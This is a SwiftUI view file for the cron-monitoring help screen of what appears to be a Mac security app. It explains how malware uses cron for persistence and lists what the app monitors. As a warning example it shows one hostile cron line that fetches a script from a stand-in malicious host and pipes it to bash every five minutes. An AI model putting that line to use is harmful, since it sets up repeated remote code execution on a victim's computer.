import SwiftUI

struct CronInfo: View {
    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 20) {
                Text("Cron Job Monitoring")
                    .font(.macGuardianTitle2)
                    .foregroundColor(.themeText)
                
                Text("Cron jobs are scheduled tasks that run automatically on your Mac. Malware often uses cron to ensure it starts automatically.")
                    .font(.macGuardianBody)
                    .foregroundColor(.themeText)
                    .lineSpacing(4)
                
                Text("What We Monitor")
                    .font(.macGuardianTitle3)
                    .foregroundColor(.themeText)
                    .padding(.top)
                
                VStack(alignment: .leading, spacing: 12) {
                    InfoBullet(text: "New cron jobs added to your system")
                    InfoBullet(text: "Changes to existing cron schedules")
                    InfoBullet(text: "Suspicious patterns (downloading from internet, obfuscated commands)")
                    InfoBullet(text: "Jobs running with elevated privileges")
                }
                
                Text("Why It Matters")
                    .font(.macGuardianTitle3)
                    .foregroundColor(.themeText)
                    .padding(.top)
                
                Text("Malware uses cron jobs to maintain persistence - ensuring it runs even after reboots. By monitoring cron, we can detect when malicious scheduled tasks are added to your system.")
                    .font(.macGuardianBody)
                    .foregroundColor(.themeText)
                    .lineSpacing(4)
                
                Text("Example Suspicious Pattern")
                    .font(.macGuardianTitle3)
                    .foregroundColor(.themeText)
                    .padding(.top)
                
                CardContainer {
                    VStack(alignment: .leading, spacing: 8) {
                        Text("*/5 * * * * curl http://malicious.com | bash")
                            .font(.system(.body, design: .monospaced))
                            .foregroundColor(.red)
                            .padding()
                            .background(Color.themeBlack)
                            .cornerRadius(6)
                        Text("This cron job runs every 5 minutes, downloads code from the internet, and executes it - a classic malware pattern.")
                            .font(.macGuardianBody)
                            .foregroundColor(.themeTextSecondary)
                    }
                }
            }
            .padding(LayoutGuides.paddingLarge)
        }
        .background(Color.themeBlack)
    }
}

